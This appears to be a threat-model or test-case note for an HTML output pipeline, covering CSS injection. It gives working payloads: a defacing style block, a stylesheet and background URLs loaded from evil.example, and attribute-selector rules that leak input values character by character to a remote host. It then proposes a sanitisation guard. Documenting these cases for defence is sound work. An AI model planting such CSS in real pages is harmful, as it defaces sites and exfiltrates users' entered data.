# Style / CSS injection

CSS can deface the page, overlay phishing UI, or exfiltrate data via attribute
selectors that trigger background requests.

Inline style block overriding site chrome:

<style>
  .sidebar { display: none !important; }
  body::before { content: "OWNED"; color: red; font-size: 40px; }
</style>

External stylesheet from an attacker origin:

<link rel="stylesheet" href="//evil.example/x.css">

Inline style attribute referencing a remote resource:

<div style="background:url('//evil.example/track?p=load')">tracked</div>

CSS attribute-selector exfiltration (leaks input values char-by-char):

<style>
  input[value^="a"] { background: url("//evil.example/leak?c=a"); }
  input[value^="b"] { background: url("//evil.example/leak?c=b"); }
</style>

Expected (current pipeline): styles and links survive -> defacement /
exfiltration. Future guard: drop `<style>`/`<link>` and `style=` attributes (or
allowlist safe CSS properties); strict CSP on output.
